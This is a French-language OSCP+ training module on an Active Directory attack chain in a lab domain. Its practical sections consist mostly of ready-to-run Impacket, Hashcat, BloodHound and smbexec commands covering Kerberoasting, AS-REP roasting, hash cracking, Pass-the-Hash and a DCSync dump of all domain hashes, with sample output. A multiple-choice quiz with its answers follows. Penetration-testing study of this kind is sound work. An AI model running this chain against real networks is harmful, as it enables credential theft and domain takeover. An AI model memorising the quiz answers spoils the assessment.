# TOME P7 — Certifications d'Élite & Spécialisations — Jour 302 (6h) : OSCP+ Prep — Active Directory Full Chain (Kerberoasting, AS-REP Roasting, BloodHound Shortest Paths, Pass-the-Hash & DCSync)

> [!NOTE]
> **Objectif du jour :** Maîtriser la **chaîne d'attaque Active Directory complète de niveau OSCP+** : identifier et exploiter les comptes vulnérables via **Kerberoasting** et **AS-REP Roasting**, cartographier les chemins d'escalade avec **BloodHound**, effectuer du mouvement latéral via **Pass-the-Hash (PtH)**, et obtenir tous les hashes du domaine via **DCSync** avec Impacket.
>
> **Compétences visées :** `OSCP-03` (A) — Kerberoasting & AS-REP Roasting | `OSCP-04` (A) — BloodHound Paths & DCSync

---

## 1) Module — Kerberoasting & AS-REP Roasting (2h)

### 📖 Narration/Intuition

**Kerberoasting** : Tout utilisateur Active Directory authentifié peut demander un ticket Kerberos TGS pour n'importe quel compte de service ayant un **SPN (Service Principal Name)**. Ce ticket TGS est chiffré avec le hash NTLM du compte de service et peut être craqué **hors ligne** avec Hashcat.

**AS-REP Roasting** : Les comptes AD dont l'attribut `Do not require Kerberos preauthentication` est activé répondent au KDC sans avoir besoin du mot de passe client. L'AS-REP chiffré peut être soumis à Hashcat.

---

## 2) Module — Exploitation Kerberoasting + AS-REP avec Impacket (`kerberoast_chain.sh`) (2h)

### 🛠️ Atelier Pratique

```bash
# ═══════════════════════════════════════════════════════
# ÉTAPE 1 — Kerberoasting : Extraction de tous les TGS chiffrables
# ═══════════════════════════════════════════════════════
# Impacket GetUserSPNs.py — Liste les comptes avec SPN et demande leurs TGS
GetUserSPNs.py PARADIS.LOCAL/jdupont:Password123 -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt

# Vérification du format récupéré (Kerberos 5 TGS-REP etype 23)
head -2 kerberoast_hashes.txt
# $krb5tgs$23$*svc_mssql$PARADIS.LOCAL$...

# ═══════════════════════════════════════════════════════
# ÉTAPE 2 — Crackage offline des TGS avec Hashcat (mode 13100)
# ═══════════════════════════════════════════════════════
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
# Résultat : svc_mssql : ServicePass2024

# ═══════════════════════════════════════════════════════
# ÉTAPE 3 — AS-REP Roasting : Comptes sans préauthentification
# ═══════════════════════════════════════════════════════
GetNPUsers.py PARADIS.LOCAL/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10 -format hashcat -outputfile asrep_hashes.txt

# Crackage AS-REP (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

---

## 3) Module — BloodHound, Pass-the-Hash & DCSync (`ad_full_chain.sh`) (2h)

```bash
# ═══════════════════════════════════════════════════════
# ÉTAPE 1 — Collecte BloodHound depuis Linux (bloodhound-python)
# ═══════════════════════════════════════════════════════
bloodhound-python -u jdupont -p Password123 -d PARADIS.LOCAL -ns 192.168.1.10 --zip
# Charger le ZIP dans BloodHound -> Analyse "Shortest Paths to Domain Admins"

# ═══════════════════════════════════════════════════════
# ÉTAPE 2 — Pass-the-Hash (PtH) avec le hash NTLM du compte de service cracké
# ═══════════════════════════════════════════════════════
# Récupération du hash NTLM depuis le compte svc_mssql compromis
secretsdump.py PARADIS.LOCAL/svc_mssql:ServicePass2024@192.168.1.20

# PtH vers un DC avec le hash NTLM Admin local récupéré
smbexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 Administrator@192.168.1.10

# ═══════════════════════════════════════════════════════
# ÉTAPE 3 — DCSync : Extraction de TOUS les hashes du domaine
# ═══════════════════════════════════════════════════════
secretsdump.py PARADIS.LOCAL/Administrator@192.168.1.10 -just-dc
# Résultat : krbtgt hash -> Fabrication de Golden Tickets possible !
# Administrator:500:aad3b435b51404ee:32ed87bdb5fdc5e9...
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **SPN** | Service Principal Name — Identifiant d'un service Kerberos dans l'AD |
| **AS-REP** | Authentication Service Reply — Réponse KDC exploitée dans l'AS-REP Roasting |
| **PtH** | Pass-the-Hash — Technique d'authentification utilisant le hash NTLM brut sans mot de passe |
| **DCSync** | Attaque simulant un DC secondaire pour répliquer tous les hashes NTLM via DRSUAPI |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Pourquoi le **Kerberoasting** est-il une attaque particulièrement dangereuse dans les environnements Active Directory ?
- A) Parce que tout utilisateur authentifié peut demander un TGS chiffré avec le hash NTLM d'un compte de service, puis le craquer hors ligne sans générer d'alerte sur le DC
- B) Parce qu'il nécessite un exploit 0-day
- C) Parce qu'il désactive le pare-feu Windows
- D) Parce qu'il efface les journaux de sécurité

**Réponse : A**

**Q2 :** Quel mode Hashcat permet de craquer les TGS extraits lors d'une attaque Kerberoasting ?
- A) Mode 13100 (Kerberos 5 TGS-REP etype 23 / RC4)
- B) Mode 1000 (NTLM)
- C) Mode 0 (MD5)
- D) Mode 3200 (bcrypt)

**Réponse : A**

**Q3 :** Quel attribut d'un compte Active Directory doit être configuré pour qu'il soit vulnérable à l'**AS-REP Roasting** ?
- A) `Do not require Kerberos preauthentication` (DONT_REQ_PREAUTH) coché
- B) `Password never expires` coché
- C) `Account is sensitive` décoché
- D) `Smart card required` coché

**Réponse : A**

**Q4 :** Qu'est-ce que le **DCSync** et quels droits Active Directory sont nécessaires pour l'exécuter ?
- A) Imiter un contrôleur de domaine secondaire pour demander la réplication de tous les objets AD (hashes) via le protocole DRSUAPI — nécessite `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`
- B) Synchroniser l'heure du domaine
- C) Exporter les objets GPO
- D) Réinstaller SYSVOL

**Réponse : A**

**Q5 :** Dans BloodHound, quel algorithme est utilisé pour calculer automatiquement les **Shortest Paths to Domain Admins** à partir d'un nœud compromis ?
- A) L'algorithme de Dijkstra / BFS sur le graphe Neo4j des relations ACL Active Directory
- B) MD5 Hash
- C) Algorithme RSA
- D) Méthode AES-GCM

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
